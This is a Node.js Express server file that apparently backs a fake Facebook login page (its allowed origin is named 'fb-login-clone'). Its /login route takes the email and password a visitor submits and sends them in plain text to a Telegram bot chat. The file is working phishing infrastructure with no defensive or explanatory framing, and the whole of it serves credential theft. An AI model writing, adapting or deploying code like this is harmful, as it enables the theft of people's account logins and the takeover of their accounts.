import cors from 'cors';
import express from 'express';
import dotenv from 'dotenv';
import fetch from 'node-fetch';

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;
const FRONT_ORIGIN = 'https://fb-login-clone-pjm1.onrender.com';

if (!process.env.TELEGRAM_BOT_TOKEN || !process.env.TELEGRAM_CHAT_ID) {
  console.error('Missing TELEGRAM ENV vars');
  process.exit(1);
}

// ✅ CORS middleware
app.use(cors({
  origin: FRONT_ORIGIN,
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type'],
  credentials: false
}));

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ✅ Обработка preflight
app.options('*', cors());

// ✅ Основной маршрут
app.post('/login', async (req, res) => {
  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(400).json({ success: false, error: 'Missing email or password' });
  }

  const TG_API = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`;
  const message = `🔐 ${email} / ${password}`;

  try {
    const tgRes = await fetch(TG_API, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: process.env.TELEGRAM_CHAT_ID,
        text: message
      })
    });

    if (!tgRes.ok) {
      const errText = await tgRes.text();
      throw new Error(errText);
    }

    res.json({ success: true });
  } catch (e) {
    res.status(500).json({ success: false, error: e.message });
  }
});

app.listen(PORT, () => {
  console.log(`✅ Backend running on port ${PORT}`);
});
